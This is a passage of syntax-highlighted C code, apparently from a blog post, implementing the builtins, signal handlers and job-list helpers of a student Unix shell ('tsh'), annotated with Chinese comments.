class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc - <span class="number">1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *cmd = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 检查合法性</span></span><br><span class="line">    <span class="keyword">if</span> (!cmd || !<span class="built_in">strlen</span>(cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cmmond not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判定4种内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;quit&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 考虑当前还有后台进程，需要kill</span></span><br><span class="line">        <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">        sigfillset(&amp;mask_all);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 先kill 所有子进程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jobs[i].pid)</span><br><span class="line">            &#123;</span><br><span class="line">                kill(jobs[i].pid, SIGKILL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        clearjob(jobs);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;jobs&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, cmd) || !<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* not a builtin command */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span>本函数假设argv[0] 只能 = fg 或者 = bg</span></span><br><span class="line">    <span class="keyword">char</span> *arg = argv[<span class="number">1</span>]; <span class="comment">// 命令参数</span></span><br><span class="line">    <span class="keyword">int</span> jid = <span class="number">-1</span>, pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令是否有效？</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数后续是否全是数字</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (*arg != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*arg))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    arg = argv[<span class="number">1</span>]; <span class="comment">// 还原</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取job</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// jid mod</span></span><br><span class="line">        jid = atoi(arg + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// pid mod</span></span><br><span class="line">        pid = atoi(arg);</span><br><span class="line">        jid = pid2jid(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobjid(jobs, jid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg[<span class="number">0</span>] != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// fg mode</span></span><br><span class="line">        <span class="comment">// 后台进程转前台</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state == FG)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process is foreground already\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (job-&gt;state == ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ST -&gt; RUNNING</span></span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 测试后发现，发送SIGCONT后，也会触发一次SIGCHLD,目前原因未知</span></span><br><span class="line">            kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123; <span class="comment">// bg mode</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 后台stop进程转running进程</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state != ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process isn&#x27;t stoped\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 这里的printf后面没有加\n，因为cmdline自带\n</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Note: 因为前台进程结束后，会自动调用chld_handler,所以回收工作交给chld_handler处理</span></span><br><span class="line">    <span class="comment">// 这里只用保证tsh被阻塞即可。</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123; <span class="comment">// 从全局变量jobs中读取 fg pid，避免jobs的竞争</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> (!fgpid(jobs))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有前台进程</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="keyword">int</span> pid, wstate;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span> <span class="comment">// 触发本次sigchld_handler的job</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, &amp;wstate, WNOHANG | WUNTRACED);</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid调用返回有两种情况：</span></span><br><span class="line">    <span class="comment">// 1. 子进程terminate</span></span><br><span class="line">    <span class="comment">// 2. 通过信号，被stop了，如用户键入 ctrl+z</span></span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">    <span class="keyword">if</span> (WIFSTOPPED(wstate))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// stoped，更新状态即可</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGTSTP);</span><br><span class="line">        job-&gt;state = ST;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;   <span class="comment">// terminate，需要deletejob</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSIGNALED(wstate))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGINT);</span><br><span class="line">        &#125;</span><br><span class="line">        deletejob(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    <span class="comment">// 注意传递INT信号可能会造成死循环：具体参考https://blog.csdn.net/guozhiyingguo/article/details/53837424</span></span><br><span class="line">    <span class="comment">// 同时注意，这里kill需要发送给整个进程组</span></span><br><span class="line">    kill(-job-&gt;pid, SIGINT);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    kill(job-&gt;pid, SIGTSTP);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        clearjob(&amp;jobs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">            max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            jobs[i].pid = pid;</span><br><span class="line">            jobs[i].state = state;</span><br><span class="line">            jobs[i].jid = nextjid++;</span><br><span class="line">            <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">                nextjid = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">            <span class="keyword">if</span> (verbose)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tried to create too many jobs\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            clearjob(&amp;jobs[i]);</span><br><span class="line">            nextjid = maxjid(jobs) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">            <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> jobs[i].jid;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">            <span class="keyword">switch</span> (jobs[i].state)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> BG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Running &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Foreground &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Stopped &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,</span><br><span class="line">                       i, jobs[i].state);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, jobs[i].cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: shell [-hvp]\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -h   print this message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -v   print additional diagnostic information\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -p   do not emit a command prompt\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 